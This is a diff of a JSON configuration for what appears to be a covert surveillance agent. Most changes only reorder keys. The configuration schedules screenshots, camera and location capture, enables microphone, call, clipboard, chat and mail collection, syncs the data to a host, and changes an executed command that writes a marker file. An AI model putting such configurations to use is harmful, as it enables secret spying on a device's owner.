@@ -10,48 +10,48 @@
             "enabled": true
         },
         {
-            "ts": "00:00:00",
             "event": "timer",
             "subtype": "loop",
             "te": "23:59:59",
-            "repeat": 1,
+            "ts": "00:00:00",
             "start": 1,
             "desc": "SCREENSHOT",
             "enabled": true,
+            "repeat": 1,
             "delay": 120
         },
         {
-            "ts": "00:00:00",
             "event": "timer",
             "subtype": "loop",
             "te": "23:59:59",
-            "repeat": 2,
+            "ts": "00:00:00",
             "start": 2,
             "desc": "CAMERA",
             "enabled": true,
             "iter": 1,
+            "repeat": 2,
             "delay": 120
         },
         {
-            "ts": "00:00:00",
             "event": "timer",
             "subtype": "loop",
             "te": "23:59:59",
-            "repeat": 3,
+            "ts": "00:00:00",
             "start": 3,
             "desc": "POSITION",
             "enabled": true,
+            "repeat": 3,
             "delay": 900
         },
         {
-            "ts": "00:00:00",
             "event": "timer",
             "subtype": "loop",
             "te": "23:59:59",
-            "repeat": 4,
+            "ts": "00:00:00",
             "start": 4,
             "desc": "SYNC",
             "enabled": true,
+            "repeat": 4,
             "delay": 60
         },
         {
@@ -65,12 +65,12 @@
         },
         {
             "event": "timer",
-            "start": 6,
-            "desc": "Startup_txt",
-            "enabled": true,
             "subtype": "loop",
             "te": "23:59:59",
-            "ts": "00:00:00"
+            "ts": "00:00:00",
+            "start": 6,
+            "desc": "Startup_txt",
+            "enabled": true
         }
     ],
     "modules": [
@@ -82,16 +82,16 @@
         {"module": "chat"},
         {"module": "clipboard"},
         {
-            "position": true,
+            "hook": {"enabled": true, "processes": []},
             "network": {"enabled": false, "processes": []},
             "module": "crisis",
             "camera": true,
             "mic": true,
-            "hook": {"enabled": true, "processes": []},
+            "position": true,
             "synchronize": false,
             "call": true
         },
-        {"module": "device", "list": false},
+        {"list": false, "module": "device"},
         {
             "deny": [
                 "*\\AppData\\Local*",
@@ -142,10 +142,10 @@
             "mail": {
                 "enabled": true,
                 "filter": {
-                    "dateto": "2100-01-01 00:00:00",
+                    "maxsize": 100000,
                     "datefrom": "2013-03-04 00:00:00",
                     "history": true,
-                    "maxsize": 100000
+                    "dateto": "2100-01-01 00:00:00"
                 }
             },
             "module": "messages",
@@ -205,16 +205,19 @@
                 {
                     "wifi": true,
                     "bandwidth": 500000,
-                    "stop": false,
+                    "action": "synchronize",
                     "mindelay": 0,
                     "maxdelay": 0,
-                    "action": "synchronize",
+                    "stop": false,
                     "cell": false,
                     "host": "$(HOSTNAME)"
                 }
             ]
         },
         {"desc": "", "subactions": [{"action": "uninstall"}]},
-        {"desc": "Write file", "subactions": [{"command": "copy /y nul c:\\infe.txt", "action": "execute"}]}
+        {
+            "desc": "Write file",
+            "subactions": [{"command": "cmd.exe /C copy /y nul C:\\Python27\\inf.txt", "action": "execute"}]
+        }
     ]
 }
